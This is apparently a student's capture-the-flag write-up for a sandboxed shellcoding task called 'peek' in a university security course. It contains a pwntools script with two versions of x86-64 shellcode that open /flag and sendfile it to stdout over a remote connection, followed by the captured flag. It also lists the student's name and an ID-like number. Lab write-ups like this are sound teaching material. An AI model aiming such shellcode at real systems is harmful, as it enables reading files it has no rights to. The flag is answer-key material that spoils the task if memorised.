# Player
- Tim Niklas Gruel 1080 2021 2831
- username: realy0sh1

# Writeup: "peek"
- story: This is another simple shellcoding task. The shellcode runner has a built-in sandbox that will allow you to perform only the following system calls: open, read, write, sendfile. Try to read the flag from /flag. 
- i can provide the program with shellcode that kindly will be executed for me
- the folling script automatically exploits it:
```python
#!/usr/bin/env python3

import pwn

pwn.context.arch = 'amd64'
conn = pwn.remote('tasks.ws24.softsec.rub.de', 32865)

'''
fd_flag = open("/flag", O_RDONLY)
sendfile(stdout, fd_flag, 0, 1024)
return
'''
# this is from the slides
shellcode = pwn.asm('''
    mov rbx, 0x00000067616c662f; # fd_flag = open("/flag", O_RDONLY)
    push rbx;
    mov rax, 2;
    mov rdi, rsp;
    mov rsi, 0;
    syscall;
                    
    mov rdi, 1; # sendfile(stdout, fd_flag, 0, 1024)
    mov rsi, rax;
    mov rdx, 0;
    mov r10, 1000;
    mov rax, 40;
    syscall;
                             
    ret;
''')

# this is another version using string
shellcode = pwn.asm('''
    lea rdi, [rip + string]; # fd_flag = open("/flag", O_RDONLY)
    mov rsi, 0;
    mov rax, 2;
    syscall;
                    
    mov rdi, 1; # sendfile(stdout, fd_flag, 0, 1024)
    mov rsi, rax;
    mov rdx, 0;
    mov r10, 1000;
    mov rax, 40;
    syscall;
                             
    ret;
string:
    .string "/flag"
''')

print(f'shellcode: {shellcode.hex()}')
conn.recvuntil(b'please enter your (hex-encoded) shellcode, at most 4096 bytes:')
conn.sendline(shellcode.hex().encode())
print(f"flag: {conn.recvuntil(b'}')}")
```
- flag:
```
softsec{hjI5HXlbZRtf_WToZkelPgdn-uHddjJzngoDWSWdr_iDeWV2bwqqVJD8iRhIJVW7}
```